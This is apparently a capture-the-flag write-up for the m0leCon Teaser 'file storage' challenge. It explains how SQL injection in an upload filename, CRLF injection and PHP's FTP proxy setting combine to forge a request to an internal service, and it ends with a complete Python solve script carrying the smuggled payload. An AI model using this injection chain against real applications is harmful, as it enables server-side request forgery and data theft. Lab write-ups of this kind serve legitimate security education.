---

title: "nday: file storage - m0leCon Teaser CTF"
date: 11 September 2024
category: CRLF,SQLI
ctf: m0leCon Teaser CTF

---

This challenge is from the `m0leCon Teaser CTF`. It was an interesting but relatively easy challenge, so the write-up will be brief. The objective was to exploit `SQL Injection` (SQLi) and `CRLF` (Carriage Return Line Feed) vulnerabilities to retrieve the flag from an internal server. Two services were running: an FTP server and a Node.js application, alongside a PHP server running on Nginx.

---

## Services

### FTP
```dockerfile
COPY vsftpd.conf /etc/vsftpd/vsftpd.conf
```

The FTP service uses [`vsftpd`](https://en.wikipedia.org/wiki/Vsftpd), a popular FTP server for Linux.

### Node.js

```javascript
app.post("/flag", (req, res) => {
  if (!!req.headers["x-get-flag"]) {
    res.send(process.env.FLAG || "ptm{REDACTED}");
  } else {
    res.send("nope");
  }
});
```

Our goal is to send a POST request to the Node.js application with an `x-get-flag` header. In addition, there is another route, `/create-user`, which creates a new user.

### PHP

- You can sign up by completing a Proof of Work (PoW).
- You can upload and download files.

#### *The server connects to the FTP service using `fopen`*:

```php
$ftp = @fopen("ftp://{$_SESSION['user']}:{$_SESSION['password']}@ftp/$filename", 'r', false, $context);
```

This retrieves the file and sends it as a response.

---

## Vulnerabilities

### SQLi
#### In `php/www/components/file_manager.php`:

```php
$stmt = $database->prepare("INSERT INTO files (owner, filename, size) VALUES (:owner, '$filename', :size)");
```

Here, the application directly incorporates user-specified values into the SQL query, allowing us to inject in filename.

### CRLF
#### In the same file, there is a CRLF injection vulnerability:

```php
header('Content-Disposition: attachment; filename="' . urlencode($filename) . '"');
```

The same `filename` parameter introduces another vulnerability, allowing us to exploit CRLF injection.

---

## Exploit

```php
// @/php/www/components/file_manager.php
$opts = ['ftp' => $_SESSION['settings']];
$context = stream_context_create($opts);

// @/php/www/components/index.php
if (isset($_POST['settings'])) {
    $data = json_decode($_POST['settings'], true);
    if (!is_array($data)) {
        die;
    }
    $_SESSION['settings'] = $data;
}
```

The application uses session settings to create a stream context, which is user-controlled. PHP's FTP stream context allows a [`proxy`](https://www.php.net/manual/en/context.ftp.php) to be passed. By using this, we can send an HTTP request via CRLF injection.

---

### Solve Script
#### **Here is my solve script:**

```python
import requests
import urllib

url = "http://localhost:8080"
name = "x HTTP/1.1\r\nHost: ftp\r\n\r\n\r\nPOST /flag HTTP/1.1\r\nx-get-flag:"
data = f"'||(SELECT x'{name.encode().hex()}')||'"

file = {'file': (data, "")}
sess = {"PHPSESSID": "21n3bc7elm25b7r7lml2r7neq1"}

if requests.post(url, files=file, cookies=sess).status_code == 200:
    conf = {'settings': '{"proxy": "tcp://ftp:3000"}'}
    if requests.post(url, data=conf, cookies=sess).status_code == 200:
        res = requests.get(url + f"?filename={urllib.parse.quote(name)}", cookies=sess)
        print(f"Flag: {res.content}")
else:
    print("Failed!")
```

---